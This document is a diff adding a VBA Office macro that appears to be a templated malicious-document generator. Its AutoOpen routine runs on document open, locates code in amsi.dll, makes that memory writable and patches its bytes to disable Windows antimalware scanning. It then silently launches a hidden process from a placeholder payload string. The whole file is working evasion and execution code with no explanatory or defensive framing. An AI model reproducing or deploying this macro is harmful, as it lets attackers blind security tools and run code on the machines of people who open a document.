@@ -1,0 +1,123 @@
+Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
+Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
+Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
+Private Declare PtrSafe Sub ByteSwapper Lib "kernel32.dll" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
+Private Declare PtrSafe Sub Peek Lib "msvcrt" Alias "memcpy" (ByRef pDest As Any, ByRef pSource As Any, ByVal nBytes As Long)
+Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpaVAR29a As aVAR29a, lpProcessInformation As aVAR28a) As Long
+Private Declare PtrSafe Function OpenProcess Lib "kernel32.dll" (ByVal dwAccess As Long, ByVal fInherit As Integer, ByVal hObject As Long) As Long
+Private Declare PtrSafe Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
+Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+ 
+Private Type aVAR28a
+    hProcess As Long
+    hThread As Long
+    dwProcessId As Long
+    dwThreadId As Long
+End Type
+ 
+Private Type aVAR29a
+    cb As Long
+    lpReserved As String
+    lpDesktop As String
+    lpTitle As String
+    dwX As Long
+    dwY As Long
+    dwXSize As Long
+    dwYSize As Long
+    dwXCountChars As Long
+    dwYCountChars As Long
+    dwFillAttribute As Long
+    dwFlags As Long
+    wShowWindow As Integer
+    cbReserved2 As Integer
+    lpReserved2 As Long
+    hStdInput As Long
+    hStdOutput As Long
+    hStdError As Long
+End Type
+ 
+
+Function aFUNC1a(aVAR1a As String, aVAR2a As String) As LongPtr
+  Dim aVAR3a As LongPtr
+  aVAR3a = LoadLibrary(aVAR1a)
+  aFUNC1a = GetProcAddress(aVAR3a, aVAR2a)
+End Function
+
+Function aFUNC2a(aVAR4a As LongPtr, aVAR5a As Integer) As String
+  Dim aVAR6a As String
+  Dim aVAR7a As LongPtr
+  Dim aVAR8a As LongPtr
+  On Error Resume Next
+  aVAR8a = aVAR4a - aVAR5a
+  Dim aVAR9a As Integer
+  For aVAR9a = 0 To aVAR5a
+      Peek aVAR7a, ByVal (aVAR8a + aVAR9a), 1
+ 
+      If aVAR7a < 16 Then
+          FixedByteString = "0" & Hex(aVAR7a)
+          aVAR6a = aVAR6a & FixedByteString
+      Else
+          aVAR6a = aVAR6a & Hex(aVAR7a)
+      End If
+  Next aVAR9a
+  aFUNC2a = aVAR6a
+End Function
+ 
+Function aFUNC3a(aVAR10a As LongPtr, aVAR11a As Integer, aVAR12a As Integer) As LongPtr
+  Dim aVAR13a As Integer
+  aVAR13a = (aVAR12a - 1) / 2
+  aFUNC3a = (aVAR10a - aVAR11a) + aVAR13a
+End Function
+
+Sub AutoOpen()
+  Dim aVAR14a As LongPtr
+  Dim aVAR15a As String
+  Dim aVAR16a As String
+  Dim aVAR17a As String
+  Dim aVAR18a As LongPtr
+  Dim aVAR19a As LongPtr
+  Dim aVAR20a As Integer
+  Dim aVAR21a As Integer
+  Dim aVAR22a As Integer
+  aVAR15a = "8B450C85C0745A85DB"
+  aVAR16a = "8B550C85D27434837D"
+  aVAR20a = 300
+  aVAR22a = 0
+  aVAR14a = aFUNC1a("amsi.dll", "AmsiUacInitialize")
+  aVAR17a = aFUNC2a(aVAR14a, aVAR20a)
+  aVAR21a = InStr(aVAR17a, aVAR15a)
+  If aVAR21a = 0 Then
+    
+  Else
+      aVAR18a = aFUNC3a(aVAR14a, aVAR20a, aVAR21a)
+      Debug.Print Hex(aVAR18a)
+      Result = VirtualProtect(ByVal aVAR18a, 32, 64, 0)
+      ByteSwapper ByVal (aVAR18a + 0), 1, Val("&H" & "90")
+      ByteSwapper ByVal (aVAR18a + 1), 1, Val("&H" & "31")
+      ByteSwapper ByVal (aVAR18a + 2), 1, Val("&H" & "C0")
+      aVAR22a = aVAR22a + 1
+  End If
+  aVAR21a = InStr(aVAR17a, aVAR16a)
+  If aVAR21a = 0 Then
+  Else
+      aVAR19a = aFUNC3a(aVAR14a, aVAR20a, aVAR21a)
+      Debug.Print Hex(aVAR19a)
+      Result = VirtualProtect(ByVal aVAR19a, 32, 64, 0)
+      ByteSwapper ByVal (aVAR19a + 0), 1, Val("&H" & "90")
+      ByteSwapper ByVal (aVAR19a + 1), 1, Val("&H" & "31")
+      ByteSwapper ByVal (aVAR19a + 2), 1, Val("&H" & "D2")
+      aVAR22a = aVAR22a + 1
+  End If
+  Call aFUNC4a
+End Sub
+
+Sub aFUNC4a()
+  Dim aVAR23a As aVAR28a
+  Dim aVAR24a As aVAR29a
+  Dim aVAR25a As String
+  Dim aVAR26a As Long
+  Dim aVAR27a As Long
+  aVAR26a = CreateProcess(aVAR25a, "aPAYLOADa", ByVal 0&, ByVal 0&, 1&, &H8000000, ByVal 0&, aVAR25a, aVAR24a, aVAR23a)
+  aVAR27a = CloseHandle(aVAR23a.hThread)
+  aVAR27a = CloseHandle(aVAR23a.hProcess)
+End Sub
